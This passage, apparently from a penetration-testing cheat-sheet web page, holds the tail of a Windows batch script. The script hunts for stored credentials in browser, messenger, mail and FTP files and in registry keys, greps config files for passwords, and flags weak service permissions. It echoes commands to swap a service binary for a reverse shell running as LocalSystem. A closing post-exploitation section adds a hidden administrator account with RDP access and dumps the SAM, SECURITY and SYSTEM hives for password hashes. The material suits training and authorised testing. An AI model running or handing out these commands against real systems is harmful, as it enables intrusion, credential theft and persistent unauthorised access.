&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*[.]vnc$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*groups[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*printers[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*drives[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*scheduledtasks[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*services[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*datasources[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.rsa.*[.].*$ | findstr &#x2F;VI \.*.dll$ | findstr &#x2F;VI \.*.rat$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.dsa.*[.].*$ | findstr &#x2F;VI \.*.dll$ | findstr &#x2F;VI \.*.exe$ | findstr &#x2F;VI \.*.gif$ | findstr &#x2F;VI \.*.handsafe[.]reg$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*[.]dbx$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.account.*.$ | findstr &#x2F;VI \.*.User.Account.Picture.*. | findstr &#x2F;VI \.*.bmp$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*ntds[.].*$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*hiberfil[.].*$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*boot[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*win[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\config\\RegBack
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\CCM\\logs
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\iis.[.]log$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\Content.IE.\\index.dat$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\inetpub\\logs\\LogFiles
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\httperr\\httpe.*.[.]log$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.\\Panther\\ | findstr &#x2F;VI \.*.Resources\\Themes\\.*.
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.syspre.*,[.]...$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.unatten.*.[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*.unatten.*.[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Login.Data$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Web.Data$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Credentials.Store$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Credential.Store$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Microsoft\\Credentials.*
&lt;&#x2F;span&gt;&lt;span&gt;REM Avant Browser:
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*forms[.]dat[.]vdt$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*default\\formdata\\forms[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM Comodo Dragon
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Dragon\\User.Data\\Default.*
&lt;&#x2F;span&gt;&lt;span&gt;REM CoolNovo
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*ChromePlus\\User.Data\\Default.*
&lt;&#x2F;span&gt;&lt;span&gt;REM Firefox
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Firefox\\Profiles\\.*[.]default$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*key3[.]db$
&lt;&#x2F;span&gt;&lt;span&gt;REM Flock Browser
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Flock\\User.Data\\Default.*
&lt;&#x2F;span&gt;&lt;span&gt;REM Google Chrome
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Chrome\\User.Data\\Default.*
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Chrome.SXS\\User.Data\\Default.*
&lt;&#x2F;span&gt;&lt;span&gt;REM Internet Explorer
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Microsoft\\Credentials.*
&lt;&#x2F;span&gt;&lt;span&gt;REM Maxthon
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*MagicFill.*
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*MagicFill2[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM Opera
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Wand[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM Safari
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*keychain[.]plist$
&lt;&#x2F;span&gt;&lt;span&gt;REM SeaMonkey
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*signons[.]sqlite$
&lt;&#x2F;span&gt;&lt;span&gt;REM AIM
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*aimx[.]bin$
&lt;&#x2F;span&gt;&lt;span&gt;REM Digsby
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*logininfo[.]yaml$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*digsby[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM Meebo Notifier
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*MeeboAccounts[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;REM Miranda IM
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Miranda\\.*[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM MySpace IM
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*MySpace\\IM\\users[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;REM Pidgin
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Accounts[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;REM Skype
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Skype.*config[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;REM Tencent QQ
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Registry[.]db$
&lt;&#x2F;span&gt;&lt;span&gt;REM Trillian
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*accounts[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;REM XFire
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*XfireUser[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;REM Foxmail
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Account[.]stg$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Accounts[.]tdat$
&lt;&#x2F;span&gt;&lt;span&gt;REM ThunderBird
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*signons[.]sqlite$
&lt;&#x2F;span&gt;&lt;span&gt;REM Windows Live Mail
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*[.]oeaccount$
&lt;&#x2F;span&gt;&lt;span&gt;REM FileZilla
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*recentservers[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;REM FlashFXP
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Sites[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM FTPCommander
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*Ftplist[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;REM SmartFTP
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*SmartFTP.*[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;REM WS_FTP
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*ws_ftp[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;REM Heroes of Newerth
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*login[.]cfg$
&lt;&#x2F;span&gt;&lt;span&gt;REM JDownloader
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*JDownloader.*
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*database[.]script$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*accounts[.]ejs$
&lt;&#x2F;span&gt;&lt;span&gt;REM OrbitDownloader
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*sitelogin[.]dat$
&lt;&#x2F;span&gt;&lt;span&gt;REM Seesmic
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*data[.]db$
&lt;&#x2F;span&gt;&lt;span&gt;REM SuperPutty
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*sessions[.]xml$
&lt;&#x2F;span&gt;&lt;span&gt;REM TweetDeck
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*TweetDeck.*
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*[.]localstorage$
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:findinterestingregistrykeys
&lt;&#x2F;span&gt;&lt;span&gt;REM Source: securityxploded dot com slash passwordsecrets dot php
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST AIM6found (reg query &amp;quot;HKCU\SOFTWARE\America Online\AIM6\Passwords&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST AIMPROfound (reg query &amp;quot;HKCU\SOFTWARE\AIM\AIMPRO&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST IE6found (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Protected Storage System Provider&amp;quot; &#x2F;v &amp;quot;Protected Storage&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST IE7found (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST BEYLUXEfound (reg query &amp;quot;HKCU\SOFTWARE\Beyluxe Messenger&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST BIGANTfound (reg query &amp;quot;HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST CAMFROGfound (reg query &amp;quot;HKCU\SOFTWARE\Camfrog\Client&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST GOOGLETALKfound (reg query &amp;quot;HKCU\SOFTWARE\Google\Google Talk\Accounts&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST IMVUfound (reg query &amp;quot;HKCU\SOFTWARE\IMVU&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST NIMBUZZfound (reg query &amp;quot;HKCU\SOFTWARE\Nimbuzz\PCClient\Application&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST PALTALKfound (reg query &amp;quot;HKCU\SOFTWARE\Paltalk&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST YAHOOPAGERfound (reg query &amp;quot;HKCU\SOFTWARE\Yahoo\Pager&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST INCREDIMAIL (reg query &amp;quot;HKCU\SOFTWARE\IncrediMail&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST OUTLOOK2013found (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST OUTLOOK2010POSTNTfound (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST OUTLOOK2010PRENTfound (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST OUTLOOK98MAILONLYfound (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST OUTLOOK98NORMALfound (reg query &amp;quot;HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST DREAMWEAVERfound (reg query &amp;quot;HKCU\SOFTWARE\Adobe\Common\10\Sites&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST GMAILDESKTOPfound (reg query &amp;quot;HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST IDMfound (reg query &amp;quot;HKCU\SOFTWARE\DownloadManager\Passwords&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;IF EXIST PICASAfound (reg query &amp;quot;HKCU\SOFTWARE\Google\Picasa&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;REM
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:findpasswords
&lt;&#x2F;span&gt;&lt;span&gt;echo.Searching for passwords (this can take a while)
&lt;&#x2F;span&gt;&lt;span&gt;echo.-----------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;findstr &#x2F;si pwd= *.xml *.ini *.txt
&lt;&#x2F;span&gt;&lt;span&gt;findstr &#x2F;si password= *.xml *.ini *.txt
&lt;&#x2F;span&gt;&lt;span&gt;findstr &#x2F;si pass= *.xml *.ini *.txt
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:checkweakpermissions
&lt;&#x2F;span&gt;&lt;span&gt;echo.Searching for weak service permissions (this can take a while)
&lt;&#x2F;span&gt;&lt;span&gt;echo.--------------------------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;if exist serviceexes.txt del serviceexes.txt
&lt;&#x2F;span&gt;&lt;span&gt;if exist dirlisting.txt del dirlisting.txt
&lt;&#x2F;span&gt;&lt;span&gt;dir \ &#x2F;a&#x2F;s&#x2F;b &amp;gt; dirlisting.txt
&lt;&#x2F;span&gt;&lt;span&gt;for &#x2F;f &amp;quot;tokens=1 delims=,&amp;quot; %%a in (&amp;#39;tasklist &#x2F;SVC &#x2F;FO CSV ^| findstr &#x2F;I \.*exe*. ^| findstr &#x2F;VI &amp;quot;smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe&amp;quot;&amp;#39;) do (findstr %%a$ | findstr &#x2F;VI &amp;quot;\.*winsxs\\*.&amp;quot;) &amp;lt;dirlisting.txt &amp;gt;&amp;gt; serviceexes.txt
&lt;&#x2F;span&gt;&lt;span&gt;REM In the line below we parse serviceexes.txt and check each line for write access. We check write access by appending (writing) nothing to the file, we then use batch logic to test results and output results in echo
&lt;&#x2F;span&gt;&lt;span&gt;REM for &#x2F;f &amp;quot;tokens=*&amp;quot; %%a in (serviceexes.txt) do 2&amp;gt;nul (&amp;gt;&amp;gt;%%a echo off) &amp;amp;&amp;amp; (echo === !!! RW access to service executable: %%a !!! ===) || (call)
&lt;&#x2F;span&gt;&lt;span&gt;REM Ninja magic to find out if we have write access, only partially reliable so decided to go with cacls instead
&lt;&#x2F;span&gt;&lt;span&gt;REM @echo off &amp;amp; 2&amp;gt;nul (&amp;gt;&amp;gt;&amp;quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&amp;quot; echo off) &amp;amp;&amp;amp; (echo RW access) || (echo no RW access) &amp;amp; echo on
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;for &#x2F;f &amp;quot;tokens=*&amp;quot; %%a in (serviceexes.txt) do (cacls &amp;quot;%%a&amp;quot;|findstr &#x2F;I &amp;quot;Users:&amp;quot;|findstr &#x2F;I &amp;quot;W F&amp;quot;) &amp;amp;&amp;amp; (echo === !!! Write access to service executable: %%a !!! ===) || (call)
&lt;&#x2F;span&gt;&lt;span&gt;for &#x2F;f &amp;quot;tokens=*&amp;quot; %%a in (serviceexes.txt) do (cacls &amp;quot;%%a&amp;quot;|findstr &#x2F;I &amp;quot;Everyone&amp;quot;|findstr &#x2F;I &amp;quot;W F&amp;quot;) &amp;amp;&amp;amp; (echo === !!! Write access to service executable: %%a !!! ===) || (call)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;echo.Files and folder with Read-Write access
&lt;&#x2F;span&gt;&lt;span&gt;echo.---------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;dir accesschk.exe &#x2F;a&#x2F;s&#x2F;b 1&amp;gt;2&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;	echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks ===
&lt;&#x2F;span&gt;&lt;span&gt;	goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe &#x2F;accepteula 1&amp;gt;2&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwqs &amp;quot;Everyone&amp;quot; c:\*.* | findstr &#x2F;VI &amp;quot;\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwqs &amp;quot;Users&amp;quot; c:\*.* | findstr &#x2F;VI &amp;quot;\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*.&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwqs &amp;quot;Authenticated Users&amp;quot; c:\*.*  | findstr &#x2F;VI \.*System.Volume.Information*. | findstr &#x2F;VI \.*Documents.And.Settings*.
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	echo.Searching for weak service permissions
&lt;&#x2F;span&gt;&lt;span&gt;	echo.--------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwcqv &amp;quot;Authenticated Users&amp;quot; * | Find &amp;quot;RW &amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;	if %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		accesschk.exe -uwcqv &amp;quot;Authenticated Users&amp;quot; *
&lt;&#x2F;span&gt;&lt;span&gt;		echo.****************************************************************
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe &#x2F;accepteula 1&amp;gt;2&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwcqv &amp;quot;Users&amp;quot; * | Find &amp;quot;RW &amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;	if %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		accesschk.exe -uwcqv &amp;quot;Users&amp;quot; *
&lt;&#x2F;span&gt;&lt;span&gt;		echo.*******************************************************
&lt;&#x2F;span&gt;&lt;span&gt;		echo.To plant binary in service use:
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc config [service_name] binpath= &amp;quot;C:\rshell.exe&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc config [service_name] obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc qc [service_name] (to verify!)
&lt;&#x2F;span&gt;&lt;span&gt;		echo.net start [service_name]
&lt;&#x2F;span&gt;&lt;span&gt;		echo.*******************************************************
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe &#x2F;accepteula 1&amp;gt;2&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;	accesschk.exe -uwcqv &amp;quot;Everyone&amp;quot; * | Find &amp;quot;RW &amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;	if %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		accesschk.exe -uwcqv &amp;quot;Everyone&amp;quot; *
&lt;&#x2F;span&gt;&lt;span&gt;		echo.*******************************************************
&lt;&#x2F;span&gt;&lt;span&gt;		echo.To plant binary in service use:
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc config [service_name] binpath= &amp;quot;C:\rshell.exe&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc config [service_name] obj= &amp;quot;.\LocalSystem&amp;quot; password= &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo.sc qc [service_name] (to verify!)
&lt;&#x2F;span&gt;&lt;span&gt;		echo.net start [service_name]
&lt;&#x2F;span&gt;&lt;span&gt;		echo.*******************************************************
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:cleanup
&lt;&#x2F;span&gt;&lt;span&gt;set jollykatz=
&lt;&#x2F;span&gt;&lt;span&gt;set accesschk=
&lt;&#x2F;span&gt;&lt;span&gt;set OSbit=
&lt;&#x2F;span&gt;&lt;span&gt;set whoami=
&lt;&#x2F;span&gt;&lt;span&gt;set runningelevatedprompt=
&lt;&#x2F;span&gt;&lt;span&gt;set netshfirewall=
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=
&lt;&#x2F;span&gt;&lt;span&gt;set alwaysinstallelevated=
&lt;&#x2F;span&gt;&lt;span&gt;set realvncpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;set tightvncpassfound1=
&lt;&#x2F;span&gt;&lt;span&gt;set tightvncpassfound2=
&lt;&#x2F;span&gt;&lt;span&gt;set tigervncpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;set vnc3passfound1=
&lt;&#x2F;span&gt;&lt;span&gt;set vnc3passfound2=
&lt;&#x2F;span&gt;&lt;span&gt;set vnc3passfound3=
&lt;&#x2F;span&gt;&lt;span&gt;set winautologinpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;set winautologindomainfound=
&lt;&#x2F;span&gt;&lt;span&gt;set winautologinuserfound=
&lt;&#x2F;span&gt;&lt;span&gt;set defaultloginpass=
&lt;&#x2F;span&gt;&lt;span&gt;set IE6found=
&lt;&#x2F;span&gt;&lt;span&gt;set IE7found=
&lt;&#x2F;span&gt;&lt;span&gt;set AIM6found=
&lt;&#x2F;span&gt;&lt;span&gt;set AIMPROfound=
&lt;&#x2F;span&gt;&lt;span&gt;set BEYLUXEfound=
&lt;&#x2F;span&gt;&lt;span&gt;set BIGANTfound=
&lt;&#x2F;span&gt;&lt;span&gt;set CAMFROGfound=
&lt;&#x2F;span&gt;&lt;span&gt;set GOOGLETALKfound=
&lt;&#x2F;span&gt;&lt;span&gt;set IMVUfound=
&lt;&#x2F;span&gt;&lt;span&gt;set NIMBUZZfound=
&lt;&#x2F;span&gt;&lt;span&gt;set PALTALKfound=
&lt;&#x2F;span&gt;&lt;span&gt;set YAHOOPAGERfound=
&lt;&#x2F;span&gt;&lt;span&gt;set INCREDIMAILfound=
&lt;&#x2F;span&gt;&lt;span&gt;set OUTLOOK2013found=
&lt;&#x2F;span&gt;&lt;span&gt;set OUTLOOK2010POSTNTfound=
&lt;&#x2F;span&gt;&lt;span&gt;set OUTLOOK2010PRENTfound=
&lt;&#x2F;span&gt;&lt;span&gt;set OUTLOOK98MAILONLYfound=
&lt;&#x2F;span&gt;&lt;span&gt;set OUTLOOK98NORMALfound=
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:end
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.==============
&lt;&#x2F;span&gt;&lt;span&gt;echo.Dump complete!
&lt;&#x2F;span&gt;&lt;span&gt;echo.==============
&lt;&#x2F;span&gt;&lt;span&gt;GOTO:eof
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;windows-post-exploitation&quot;&gt;Windows Post Exploitation&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;quickly-create-account-with-rdp-access&quot;&gt;Quickly create account with RDP access&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;net user offsec password1 &#x2F;add
&lt;&#x2F;span&gt;&lt;span&gt;net localgroup Administrators offsec &#x2F;add
&lt;&#x2F;span&gt;&lt;span&gt;net localgroup &amp;quot;Remote Desktop Users&amp;quot; offsec &#x2F;add
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;loot-registry-without-tools&quot;&gt;Loot registry without tools&lt;&#x2F;h3&gt;
&lt;p&gt;This might be a better technique than using tools like &lt;code&gt;wce&lt;&#x2F;code&gt; and &lt;code&gt;fgdump&lt;&#x2F;code&gt;, since you don&#x27;t have to upload any binaries. Get the registry:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;C:\&amp;gt; reg.exe save hklm\sam c:\windows\temp\sam.save
&lt;&#x2F;span&gt;&lt;span&gt;C:\&amp;gt; reg.exe save hklm\security c:\windows\temp\security.save
&lt;&#x2F;span&gt;&lt;span&gt;C:\&amp;gt; reg.exe save hklm\system c:\windows\temp\system.save
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
